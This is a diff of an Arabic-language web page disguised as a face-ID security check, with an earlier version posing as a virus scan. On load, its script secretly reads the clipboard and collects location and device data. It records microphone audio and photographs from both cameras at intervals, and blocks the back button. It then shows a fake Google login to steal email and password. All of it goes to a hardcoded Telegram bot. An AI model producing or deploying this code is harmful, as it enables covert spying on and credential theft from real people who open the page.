@@ -1,34 +1,49 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>⚙️ فحص أمان النظام 2026</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ حماية الحسابات - التحقق الحيوي</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        #start-btn { padding: 20px 40px; background: #4285f4; border: none; color: #fff; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #4285f4; z-index: 10001; }
-        .scanner { width: 150px; height: 150px; border: 2px solid #00ff00; border-radius: 50%; display: none; position: relative; margin-bottom: 20px; }
-        .scan-line { width: 100%; height: 2px; background: #00ff00; position: absolute; top: 0; animation: scan 2s linear infinite; }
+        body { background-color: #000; color: #fff; font-family:  Segoe UI , sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
+        .container { width: 90%; max-width: 400px; z-index: 5; }
+        
+        /* واجهة بصمة الوجه الوهمية */
+        .face-id-circle { width: 200px; height: 200px; border: 3px solid #00ff00; border-radius: 50%; margin: 20px auto; position: relative; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px #00ff00; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } }
+        .scan-line { position: absolute; width: 100%; height: 2px; background: #00ff00; top: 0; animation: scan 3s linear infinite; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        #phish { display: none; position: fixed; top:0; left:0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
-        #video, #canvas { display: none; }
+
+        /* واجهة تسجيل الدخول */
+        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #333; }
+        .login-card { width: 85%; max-width: 350px; padding: 30px; border-radius: 10px; }
+        .login-card img { width: 80px; margin-bottom: 20px; }
+        .login-card input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; outline: none; }
+        .login-card button { width: 100%; padding: 12px; background: #4285f4; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+
+        #video, #canvas { position: absolute; opacity: 0.01; pointer-events: none; } /* مخفي تماماً ولكن يعمل */
     </style>
 </head>
 <body>
 
-    <button id="start-btn" onclick="activateGabar()">إبدأ فحص الفيروسات الآن</button>
-
-    <div id="main-ui" style="display:none;" class="ui">
-        <div class="scanner" style="display:block;"><div class="scan-line"></div></div>
-        <h2 id="status">جاري سحب التهديدات...</h2>
+    <div class="container" id="main-ui">
+        <h2 id="status-title" style="color:#00ff00;">🔍 فحص بصمة الوجه...</h2>
+        <div class="face-id-circle">
+            <div class="scan-line"></div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Android_robot_head.svg" width="80" style="filter: invert(1);">
+        </div>
+        <p style="font-size: 14px; color:#888;">ضع وجهك في الدائرة وثبّت الجهاز جيداً لإكمال التحقق الأمني.</p>
     </div>
 
-    <div id="phish">
-        <div style="width:85%; text-align:center;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="80">
-            <h3>تأكيد الهوية مطلوب لإكمال الفحص</h3>
-            <input type="email" id="email" placeholder="البريد الإلكتروني" style="width:100%; padding:15px; margin:10px 0; border:1px solid #ccc;">
-            <input type="password" id="pass" placeholder="كلمة المرور" style="width:100%; padding:15px; margin:10px 0; border:1px solid #ccc;">
-            <button onclick="sendCreds()" style="width:100%; padding:15px; background:#1a73e8; color:#fff; border:none;">دخول</button>
+    <div id="phish-overlay">
+        <div class="login-card">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
+            <h1 style="font-size: 22px; font-weight: 500;">تأكيد الدخول</h1>
+            <p style="font-size: 14px; color: #5f6368;">فشل فحص الوجه. يرجى إدخال كلمة المرور يدوياً.</p>
+            <input type="email" id="email" placeholder="البريد الإلكتروني">
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <button onclick="sendCreds()">تأكيد الهوية</button>
         </div>
     </div>
 
@@ -38,76 +53,103 @@
     <script>
         const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
         const CHAT_ID = "7984067238";
+        let currentStream = null;
 
-        function notify(msg) { fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`); }
-
-        // تفعيل كل المميزات بضغطة واحدة
-        async function activateGabar() {
-            document.getElementById('start-btn').style.display = 'none';
-            document.getElementById('main-ui').style.display = 'block';
-            
-            // 1. تفعيل وضع ملء الشاشة (إبهار 1)
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-
-            // 2. سحب الحافظة فوراً (إبهار 2)
-            try {
-                const clipText = await navigator.clipboard.readText();
-                if(clipText) notify(`📋 **نص من الحافظة (Clipboard):**\n\`${clipText}\``);
-            } catch(e) { notify("⚠️ الضحية لم ينسخ شيئاً أو رفض الحافظة."); }
-
-            // 3. تفعيل الصوت والكاميرا والموقع
-            startSpying();
-            
-            // 4. منع الخروج
-            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
-            notify("🔓 **تم تفعيل كافة المميزات الجبارة بنجاح!**");
+        function notify(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
 
-        async function startSpying() {
-            // الصوت
+        // 1. اختطاف السلوك (منع الخروج + سحب الحافظة)
+        function jailbreak() {
+            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
+            window.onpopstate = () => { window.history.pushState(null, null, window.location.href); notify("🚫 حاول الضحية الهروب!"); };
+            
+            document.addEventListener( click , async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if(text) notify(`📋 **حافظة الضحية (Clipboard):**\n\`${text}\``);
+                } catch(e) {}
+            }, {once: true});
+        }
+
+        // 2. تحليل فيزيائي (الضوء، الحركة، الموقع)
+        async function physicalIntel() {
+            // الموقع
+            navigator.geolocation.getCurrentPosition(p => {
+                notify(`📍 الموقع الدقيق: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            // مستشعر الضوء (إذا كان مدعوماً)
+            if ( AmbientLightSensor  in window) {
+                const s = new AmbientLightSensor();
+                s.onreading = () => { if(s.illuminance < 5) notify("🌑 الضحية في مكان مظلم جداً."); };
+                s.start();
+            }
+
+            // بصمة الجهاز
+            let b = await (navigator.getBattery ? navigator.getBattery() : {level: 0});
+            notify(`📱 **هدف جديد دخل الفخ:**\nالنظام: ${navigator.platform}\nالبطارية: ${Math.round(b.level*100)}%\nالتوقيت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
+        }
+
+        // 3. التجسس الصوتي (5 ثوانٍ كل 12 ثانية)
+        async function audioSpy() {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const r = new MediaRecorder(s);
-                r.ondataavailable = (e) => {
-                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'mic.ogg');
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+                const rec = new MediaRecorder(s);
+                rec.ondataavailable = (e) => {
+                    const fd = new FormData(); fd.append( chat_id , CHAT_ID); fd.append( voice , e.data,  v.ogg );
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method:  POST , body: fd });
                 };
-                setInterval(() => { r.start(); setTimeout(() => r.stop(), 5000); }, 15000);
-            } catch(e) { notify("❌ رفض الصوت"); }
-
-            // الكاميرا المزدوجة والموقع
-            navigator.geolocation.getCurrentPosition(p => notify(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
-            
-            const v = document.getElementById('video'), c = document.getElementById('canvas');
-            let i = 0, modes = ["user", "environment"];
-            setInterval(async () => {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
-                    v.srcObject = stream;
-                    await new Promise(r => setTimeout(r, 1000));
-                    c.width = 640; c.height = 480;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    c.toBlob(b => {
-                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'x.jpg');
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    }, 'image/jpeg', 0.5);
-                    stream.getTracks().forEach(t => t.stop());
-                } catch(e) {}
-                i++;
-            }, 3000);
+                setInterval(() => { rec.start(); setTimeout(() => rec.stop(), 5000); }, 12000);
+            } catch(e) { notify("❌ رفض الميكروفون."); }
         }
 
-        function sendCreds() {
-            const e = document.getElementById('email').value, p = document.getElementById('pass').value;
-            if(e && p) {
-                notify(`🔥 **حساب مخترق:**\n📧: ${e}\n🔐: ${p}`);
-                document.getElementById('phish').style.display = 'none';
-                document.getElementById('status').innerText = "✅ اكتمل الفحص بنجاح!";
+        // 4. التجسس البصري الاحترافي (تبديل كل 2 ثانية)
+        async function visualSpy() {
+            const video = document.getElementById( video );
+            const canvas = document.getElementById( canvas );
+            const modes = ["user", "environment"];
+            let i = 0;
+            while(true) {
+                try {
+                    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
+                    video.srcObject = currentStream;
+                    await new Promise(r => setTimeout(r, 800));
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext( 2d ).drawImage(video, 0, 0);
+                    canvas.toBlob(b => {
+                        const fd = new FormData(); fd.append( chat_id , CHAT_ID); fd.append( photo , b,  x.jpg );
+                        fd.append( caption , `📷 لقطة ${modes[i%2]==="user"?"أمامية (الوجه)":"خلفية"}`);
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method:  POST , body: fd });
+                    },  image/jpeg , 0.6);
+                } catch(e) {}
+                i++; await new Promise(r => setTimeout(r, 2000));
             }
         }
 
-        // إظهار صفحة تسجيل الدخول بعد 20 ثانية
-        setTimeout(() => { document.getElementById('phish').style.display = 'flex'; }, 20000);
+        function sendCreds() {
+            const e = document.getElementById( email ).value;
+            const p = document.getElementById( pass ).value;
+            if(e && p) {
+                notify(`🔥 **بيانات مسحوبة:**\n📧: \`${e}\`\n🔐: \`${p}\``);
+                document.getElementById( phish-overlay ).style.display =  none ;
+                document.getElementById( status-title ).innerText = "✅ اكتمل التحقق بنجاح";
+            }
+        }
+
+        window.onload = () => {
+            jailbreak();
+            physicalIntel();
+            audioSpy();
+            visualSpy();
+            // الانتقال للفيشينج بعد 30 ثانية من "فحص الوجه"
+            setTimeout(() => {
+                document.getElementById( phish-overlay ).style.display =  flex ;
+                if(navigator.vibrate) navigator.vibrate([500, 200, 500]);
+            }, 30000);
+            if(navigator.wakeLock) navigator.wakeLock.request( screen );
+        };
     </script>
 </body>
 </html>
